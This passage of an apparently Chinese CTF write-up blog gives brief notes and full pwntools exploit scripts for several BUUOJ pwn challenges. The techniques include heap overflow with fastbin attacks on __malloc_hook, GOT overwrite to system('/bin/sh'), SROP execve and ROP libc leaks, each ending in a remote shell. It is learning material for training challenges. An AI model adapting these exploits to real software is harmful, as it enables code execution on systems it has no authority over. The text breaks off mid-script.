class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------</span><br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0x30</span>)+p64(free_got))<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Content : &#x27;</span>)<br>got=uu64(rc(<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#debug()</span><br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="0ctf-2017-babyheap">0ctf_2017_babyheap</h3><p>这题是我做的第一个堆题，buu题目重复了</p><p>**关键词：**堆溢出</p><p><strong>思路：</strong></p><p>1.运用堆溢出，伪造一个包含index1和2，大小的在unsortbin大小范围的块，free到unsortbin，然后申请其原来index1大小的块，main_arena附近的地址就会下移到index2的块，地址就能被dump出来。泄露了main_arena附近的地址</p><p>2.算出base=泄露addr-偏移-（ida里查看malloc_trim函数v22变量的值）</p><p>算出og，system</p><p>3.运用堆溢出，修改free后的fd，再allocate两次，就能分配道指定地址，因为要通过检查，所以地址为（malloc_hook-0x23）（偏移固定）</p><p>4.在malloc_hook的地址上填入og</p><p>5.执行allocate，就会带动shell</p><p>**注意点：**我自己重做的时候接收malloc地址出错了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28122</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allocate</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------------</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br>dump(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>base=addr-<span class="hljs-number">88</span>-<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#-----------------------------------------------------------</span><br>free(<span class="hljs-number">1</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#4</span><br>fill(<span class="hljs-number">4</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(og))<br>allocate(<span class="hljs-number">0x1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-es-7">ciscn_2019_es_7</h3><p>**关键词：**SROP</p><p>遇到有syscall，且不好找gadget的情况，考虑SROP</p><p><strong>思路：</strong></p><p>这题暗示明显，gadget里面有0xf，和0x3b赋值给rax，分别对应sigreturn，和execve</p><p><strong>具体步骤：</strong></p><p>1.靠write泄露栈的地址，gdb调试得到padding与栈的地址的偏移</p><p>可以find ‘/bin/sh’就能找到位置之间的偏移</p><p>2.rop调用sigreturn，后再填个sigframe</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25062</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#r=process(&#x27;./ciscn_2019_es_7&#x27;)</span><br>syscall_ret=<span class="hljs-number">0x400517</span><br>read=<span class="hljs-number">0x4004F1</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>mov_rax_sigreturn=<span class="hljs-number">0x4004DA</span><br>mov_rax_execve=<span class="hljs-number">0x4004E2</span><br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(read))<br>r.recv(<span class="hljs-number">0x20</span>)<br>stack_addr=u64(r.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack_addr)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.recv(<span class="hljs-number">8</span>)<br>sigframe=SigreturnFrame()<br>sigframe.rax=constants.SYS_execve<br>sigframe.rdi=stack_addr-<span class="hljs-number">0x118</span><br>sigframe.rsi=<span class="hljs-number">0x0</span><br>sigframe.rdx=<span class="hljs-number">0x0</span><br>sigframe.rsp=stack_addr<br>sigframe.rip=syscall_ret<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(mov_rax_sigreturn)+p64(syscall_ret)+<span class="hljs-built_in">str</span>(sigframe))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>记一下，要重做一下<strong>ciscn_2019_s_3</strong></p><h3 id="jarvisoj-level5">jarvisoj_level5</h3><p>**关键词：**ROP</p><p><strong>思路：</strong></p><p>1.ret2libc即可</p><p><strong>注意点：</strong></p><p>write的第三个参数pop_rdx找不到，所以断点设在第一次send前，查看rdx寄存器的值，我发现是400，就不用管了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27831</span>)<br><span class="hljs-comment">#r=process(&#x27;./level3_x64&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./level3_x64&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>pop_rsi_r15=<span class="hljs-number">0x4006b1</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_r15)+p64(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(<span class="hljs-number">0</span>)+p64(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]))<br>got=u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>og=base+o_g_old[<span class="hljs-number">2</span>]<br>r.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(og))<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-bamboobox">hitcontraining_bamboobox</h3><p>**关键词：**堆溢出</p><p>**思路：**这种题限制少，利用的姿势很多，我已经见到3种了，unlink，House of Force，和我这种我也不知道叫啥</p><p>这里我利用思路和上面0ctf几乎一致</p><p>就不细讲了</p><p>**注意点：**我本来realloc那里和og位置填错了，卡了一会，</p><p>应该填的是 ， malloc_hook前一个的realloc填og，而原本的malloc_hook中写realloc中push的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./bamboobox&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27318</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">length,name</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sa(<span class="hljs-string">&#x27;Please enter the name of item:&#x27;</span>,name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,length,name</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;Please enter the new name of the item:&#x27;</span>,name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;haha&#x27;</span>)<span class="hljs-comment">#1</span><br>show()<br>main_arena_beside=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(main_arena_beside)<br>base=main_arena_beside-<span class="hljs-number">88</span>-<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc=base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-comment">#----------------------------------------------------------------</span><br>delete(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;hahaha&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(og)+p64(realloc+<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="大二上">大二上</h2><h3 id="qctf-2018-dice-game">qctf_2018_dice_game</h3><p>溢出,控制seed值，使伪随机为固定值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 50</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">( <span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> number[MAX] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> i;<br>srand(<span class="hljs-number">0</span>); <span class="hljs-comment">/*播种子*/</span><br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; MAX; i++)&#123;<br>number[i] = rand() % <span class="hljs-number">6</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&#x27;%d&#x27;,&quot;</span>, number[i]+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./QCTF_2018_dice_game&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29426</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0</span>))<br>a=[<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span 